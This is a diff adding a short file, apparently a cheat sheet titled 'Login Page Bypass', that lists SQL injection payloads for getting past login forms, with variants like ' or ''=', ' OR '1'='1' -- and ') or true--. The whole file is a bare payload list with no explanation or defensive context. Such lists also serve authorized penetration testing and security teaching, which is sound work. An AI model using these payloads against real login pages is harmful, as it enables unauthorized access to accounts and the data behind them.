@@ -1,0 +1,31 @@
+Login Page Bypass
+SQL Injection 
+foo' or '1'='1 
+
+Username : ' or ''='
+Password : ' or ''='
+
+Username : ' or 1--
+Password : 
+') or true--
+') or ('')=('
+') or 1--
+') or ('x')=('
+
+" or true--
+" or ""="
+" or 1--
+" or "x"="
+") or true--
+") or ("")=("
+") or 1--
+") or ("x")=("
+
+')) or true--
+')) or ((''))=(('
+')) or 1--
+')) or (('x'))=(('
+' or ''='
+' OR '1'='1' --
+' OR '1'='1' ({
+' OR '1'='1' /*
